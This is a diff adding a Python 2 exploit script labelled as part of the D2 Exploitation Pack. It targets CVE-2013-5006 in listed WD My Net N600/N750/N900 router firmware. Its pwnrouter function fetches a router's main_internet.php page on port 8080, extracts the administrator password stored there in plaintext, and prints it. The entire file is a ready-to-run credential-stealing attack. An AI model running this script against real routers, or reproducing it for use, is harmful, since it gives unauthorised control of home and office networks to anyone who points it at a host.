@@ -1,0 +1,60 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_western_1'
+_vendor_ = 'western digital'
+_model_  = ['WD My Net Series N600 Firmware 1.03.12',
+            'WD My Net Series N600  Firmware 1.04.16',
+            'WD My Net Series N750  Firmware 1.03.12',
+            'WD My Net Series N750  Firmware 1.04.16',
+            'WD My Net Series N900  Firmware 1.05.12',
+            'WD My Net Series N900  Firmware 1.06.18',
+            'WD My Net Series N900  Firmware 1.06.28',
+            'WD My Net Series N900C Firmware 1.05.12',
+            'WD My Net Series N900C Firmware 1.06.18',
+            'WD My Net Series N900C Firmware 1.06.28',
+]
+_vuln_   = 'Plaintext Storage of a Password'
+_cve_    = 'CVE-2013-5006'
+_ref_    = ''
+_port_   = 8080
+
+def pwnrouter(host):
+  try:
+    nfo = cStringIO.StringIO()
+    c = pycurl.Curl()
+    c.setopt(pycurl.URL, 'http://%s:8080/main_internet.php?' % host)
+    c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+    c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+    c.perform()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  status = c.getinfo(pycurl.HTTP_CODE)
+  if status != 200:
+    print '[+] %s not vulnerable' % host
+    return
+  data = nfo.getvalue()
+  passwd = re.findall("var pass=\"(.*?)\"", data, re.DOTALL)[0]
+  print '[+] %s vulnerable:' % host
+  if passwd: print 'admin passwd : %s' % passwd
+  return
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
